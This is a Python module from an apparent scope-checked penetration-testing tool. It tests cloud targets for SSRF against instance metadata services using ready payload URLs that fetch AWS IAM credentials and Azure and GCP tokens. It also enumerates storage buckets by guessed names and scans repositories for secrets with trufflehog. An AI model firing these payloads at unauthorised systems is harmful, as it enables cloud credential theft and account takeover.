"""Cloud Security testing tools (AWS, Azure, GCP)."""

from __future__ import annotations

from kambo.docker_runner import get_runner
from kambo.models import Phase
from kambo.scope import validate_scope


async def cloud_imds_test(
    target: str,
    parameter: str = "url",
    cloud_provider: str = "aws",
) -> dict:
    """Test SSRF to cloud metadata service (IMDS).

    Args:
        target: URL with potential SSRF vulnerability
        parameter: Parameter to inject metadata URL into
        cloud_provider: aws, azure, gcp
    """
    validate_scope(target)
    runner = get_runner()

    metadata_urls = {
        "aws": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
        ],
        "azure": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
        "gcp": [
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        ],
    }

    urls = metadata_urls.get(cloud_provider, metadata_urls["aws"])
    results = []

    for meta_url in urls:
        url = target if target.startswith("http") else f"https://{target}"
        cmd = f'curl -s "{url}?{parameter}={meta_url}" 2>/dev/null | head -50'
        result = await runner.run(cmd, "cloud_imds_test", target, Phase.VULN_ANALYSIS, timeout=15)

        has_data = bool(result.raw_output.strip()) and "error" not in result.raw_output.lower()
        results.append({
            "metadata_url": meta_url,
            "response": result.raw_output[:2000],
            "accessible": has_data,
        })

    return {
        "target": target,
        "cloud_provider": cloud_provider,
        "results": results,
        "vulnerable": any(r["accessible"] for r in results),
    }


async def cloud_storage_enum(
    target: str,
    cloud_provider: str = "aws",
) -> dict:
    """Enumerate public cloud storage (S3, Azure Blob, GCS).

    Args:
        target: Organization/domain name to derive bucket names
        cloud_provider: aws, azure, gcp
    """
    validate_scope(target)
    runner = get_runner()

    # Generate bucket name variations
    base = target.replace(".", "-").replace(" ", "-").lower()
    variations = [
        base, f"{base}-dev", f"{base}-staging", f"{base}-prod",
        f"{base}-backup", f"{base}-assets", f"{base}-uploads",
        f"{base}-data", f"{base}-public", f"{base}-private",
    ]

    results = []
    if cloud_provider == "aws":
        for bucket in variations:
            cmd = f'curl -s -o /dev/null -w "%{{http_code}}" "https://{bucket}.s3.amazonaws.com" 2>/dev/null'
            result = await runner.run(cmd, "cloud_storage_enum", target, Phase.RECON, timeout=10)
            status = result.raw_output.strip()
            if status in ("200", "403"):  # 403 = exists but no access, 200 = public
                results.append({"bucket": bucket, "status": status, "public": status == "200"})

    elif cloud_provider == "azure":
        for name in variations:
            cmd = f'curl -s -o /dev/null -w "%{{http_code}}" "https://{name}.blob.core.windows.net/?comp=list" 2>/dev/null'
            result = await runner.run(cmd, "cloud_storage_enum", target, Phase.RECON, timeout=10)
            status = result.raw_output.strip()
            if status != "404":
                results.append({"container": name, "status": status})

    return {
        "target": target,
        "cloud_provider": cloud_provider,
        "found": results,
        "total_checked": len(variations),
    }


async def cloud_secret_scan(
    target: str,
    repo_url: str = "",
) -> dict:
    """Scan for exposed secrets in repositories or directories.

    Args:
        target: Target identifier (for scope)
        repo_url: Git repository URL to scan
    """
    validate_scope(target)
    runner = get_runner()

    if repo_url:
        cmd = f"trufflehog git {repo_url} --json 2>/dev/null | head -50"
    else:
        cmd = f"trufflehog filesystem /output --json 2>/dev/null | head -50"

    result = await runner.run(cmd, "cloud_secret_scan", target, Phase.VULN_ANALYSIS, timeout=120)

    import json
    secrets = []
    for line in result.raw_output.splitlines():
        try:
            entry = json.loads(line)
            secrets.append({
                "type": entry.get("DetectorName", "unknown"),
                "file": entry.get("SourceMetadata", {}).get("Data", {}).get("Filesystem", {}).get("file", ""),
                "verified": entry.get("Verified", False),
            })
        except (json.JSONDecodeError, KeyError):
            continue

    return {
        "target": target,
        "secrets_found": len(secrets),
        "secrets": secrets,
        "verified_count": sum(1 for s in secrets if s.get("verified")),
    }
